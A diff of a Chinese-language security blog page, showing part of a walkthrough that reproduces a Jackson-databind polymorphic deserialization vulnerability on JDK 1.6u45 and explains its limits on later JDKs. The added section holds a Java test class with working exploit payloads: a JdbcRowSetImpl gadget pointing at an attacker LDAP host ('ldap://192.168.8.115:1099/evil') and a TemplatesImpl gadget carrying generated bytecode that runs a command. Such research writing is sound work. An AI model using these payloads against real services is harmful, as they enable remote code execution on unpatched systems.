+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="3-3-3-Exploit-生成"><a href="#3-3-3-Exploit-生成" class="headerlink" title="3.3.3 Exploit 生成"></a>3.3.3 Exploit 生成</h4><p>从上面的分析可以知道Payload应该放在Class的默认构造器或者静态方法中，这里有两种生成字节码文件：</p>
+<p>1.直接加载class文件</p>
+<p>2.通过javassist 动态生成字节码</p>
+<pre class="line-numbers language-json"><code class="language-json">package com.thonsun.demo03<span class="token punctuation">;</span>
+
+import com.fasterxml.jackson.databind.ObjectMapper<span class="token punctuation">;</span>
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet<span class="token punctuation">;</span>
+import javassist.CannotCompileException<span class="token punctuation">;</span>
+import javassist.ClassPool<span class="token punctuation">;</span>
+import javassist.CtClass<span class="token punctuation">;</span>
+import javassist.NotFoundException<span class="token punctuation">;</span>
+import org.apache.commons.codec.binary.Base64<span class="token punctuation">;</span>
+import org.apache.commons.io.IOUtils<span class="token punctuation">;</span>
+import org.junit.Test<span class="token punctuation">;</span>
+
+import java.io.ByteArrayOutputStream<span class="token punctuation">;</span>
+import java.io.FileInputStream<span class="token punctuation">;</span>
+import java.io.IOException<span class="token punctuation">;</span>
+
+/**
+ * @Project<span class="token operator">:</span> test-poc
+ * @Desc<span class="token operator">:</span> 测试利用链
+ * @Author<span class="token operator">:</span> thonsun
+ * @Create<span class="token operator">:</span> <span class="token number">2020</span>/<span class="token number">12</span>/<span class="token number">26</span> <span class="token number">23</span><span class="token operator">:</span><span class="token number">52</span>
+ **/
+public class TestPOC <span class="token punctuation">{</span>
+    @Test
+    public void TestJdbcRowSetImpl(<span class="token punctuation">)</span> throws IOException <span class="token punctuation">{</span>
+        //com.sun.rowset.JdbcRowSetImpl
+        //<span class="token punctuation">[</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://192.168.8.115:1099/evil"</span><span class="token punctuation">,</span><span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token string">"1"</span><span class="token punctuation">}</span><span class="token punctuation">]</span>
+        String poc = <span class="token property">"[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://192.168.8.115:1099/evil\",\"autoCommit\"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token string">";
+
+        ObjectMapper objectMapper = new ObjectMapper();
+        objectMapper.enableDefaultTyping();
+        objectMapper.readValue(poc,Object.class);
+    }
+
+    @Test
+    public void TestTemplateImpl() throws IOException, CannotCompileException, NotFoundException {
+        //poc1
+        //将字节码输出，TemplateImpl loadClass 实现类的加载
+        FileInputStream fis = new FileInputStream("</span>target/test-classes/com/thonsun/demo03/ExploitOne.class<span class="token string">");
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        IOUtils.copy(fis, barr);
+        String base64Poc = Base64.encodeBase64String(barr.toByteArray());
+
+        //poc2
+        //String base64Poc = Base64.encodeBase64String(getPocbyte());
+
+
+        final String EXPLOIT_CLASS = "</span>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span class="token string">";
+        String poc = "</span><span class="token punctuation">[</span><span class="token string">"  +
+                "</span>\<span class="token string">""</span> + EXPLOIT_CLASS +<span class="token string">"\","</span>+
+                    <span class="token string">"{"</span>+
+                        <span class="token property">"\"transletBytecodes\"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"+
+                        "</span>\<span class="token string">""</span> + base64Poc + <span class="token string">"\""</span>+
+                        <span class="token string">"],"</span>+
+                        <span class="token property">"\"transletName\"</span><span class="token operator">:</span><span class="token string">" +"</span>\<span class="token string">"thonsun\","</span>+
+                        <span class="token property">"\"outputProperties\"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token string">" +
+                    "</span><span class="token punctuation">}</span><span class="token string">"+
+                "</span><span class="token punctuation">]</span><span class="token string">";
+
+        ObjectMapper objectMapper = new ObjectMapper();
+        objectMapper.enableDefaultTyping();
+        try {
+            objectMapper.readValue(poc,Object.class);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private byte[] getPocbyte() throws CannotCompileException, NotFoundException, IOException {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass cc = pool.get(TestPOC.class.getName());
+        //java.lang.Runtime.getRuntime().exec("</span>calc<span class="token string">");
+        String cmd = "</span>java.lang.Runtime.getRuntime(<span class="token punctuation">)</span>.exec(\<span class="token string">"calc\");"</span><span class="token punctuation">;</span>
+
+
+        cc.makeClassInitializer(<span class="token punctuation">)</span>.insertBefore(cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        String randomClassName = <span class="token string">"Thonsun"</span> + System.nanoTime(<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cc.setName(randomClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        cc.setSuperclass((pool.get(AbstractTranslet.class.getName(<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //设置父类
+        return cc.toBytecode(<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="3-3-4-执行效果"><a href="#3-3-4-执行效果" class="headerlink" title="3.3.4 执行效果"></a>3.3.4 执行效果</h4><p>通过JsonBeanDesierialize依据field 与 method解析json串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228150826752.png" alt="image-20201228150826752"></p>
+<p>复现环境：</p>
+<blockquote>
+<p>JDK 1.6u45</p>
+<p>jsonson-databind 2.7.8</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228172422757.png" alt="image-20201228172422757"></p>
+<h2 id="四、关于复现文章的总结："><a href="#四、关于复现文章的总结：" class="headerlink" title="四、关于复现文章的总结："></a>四、关于复现文章的总结：</h2><h3 id="1-复现环境"><a href="#1-复现环境" class="headerlink" title="1.复现环境"></a>1.复现环境</h3><p>在JDK1.6u45复现成功，从源码层调试看能够成功复现的JDK版本中 TemplateImpl 实现应满足 <code>defineTransletClasses</code>函数中没有调用 <code>_tfactory.getExternalExtensionsMap()</code> 去获取类加载器：</p>
+<p>如JDK1.6u45实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228165838951.png" alt="image-20201228165838951"></p>
+<p>JDK1.7u80实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/image-20201228170035199.png" alt="image-20201228170035199"></p>
+<p>对于使用 <code>_tfactory.getExternalExtensionsMap()</code> 的JDK来说，由于Jackson无法给_tfactory(私有且无getter&amp;setter)赋值，会抛出空指针异常没有进入下面的类加载过程。</p>
+<p>在网上找的一些博客记录Fastjson的漏洞复现就是直接给出一个payload的截图与运行结果，没有指出Payload该怎么生成与及运行成功的原理，起码给出复现的环境。所以说光看着理解是不够的，需要动手去调源码，才能加深对漏洞原理与漏洞利用的理解，发现一些限制条件。</p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1.<a href="https://vulmon.com/searchpage.php?q=jackson&amp;sortby=byrelevance&amp;remote=on&amp;local=on&amp;physical=on&amp;nanalyzed=on" target="_blank" rel="noopener">vuldb jackson</a></p>
 <p>2.<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></p>
 <script>
@@ -2197,7 +2344,7 @@ YXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB+ADo="</span><span class="token punct
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">44.2k</span> 字
+                <span class="white-color">45.2k</span> 字
             
 
             
@@ -2424,5 +2571,5 @@ $(function () {
         <!-- 背景动态彩带 洪卫 shw 2018  add 2019.09.15-->
         
 
-    <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script><script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script></body>
+    <script>!function(e){var r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function t(){for(var c=0;c<r.length;c++)t=r[c],void 0,0<=(n=t.getBoundingClientRect()).top&&0<=n.left&&n.top<=(e.innerHeight||document.documentElement.clientHeight)&&function(){var t,n,e,i,o=r[c];t=o,n=function(){r=r.filter(function(t){return o!==t})},e=new Image,i=t.getAttribute("data-original"),e.onload=function(){t.src=i,n&&n()},e.src=i}();var t,n}t(),e.addEventListener("scroll",function(){!function(t,n){clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(n)},500)}(t,e)})}(this);</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":150,"height":200},"mobile":{"show":false},"react":{"opacity":0.7}});</script></body>
 </html>
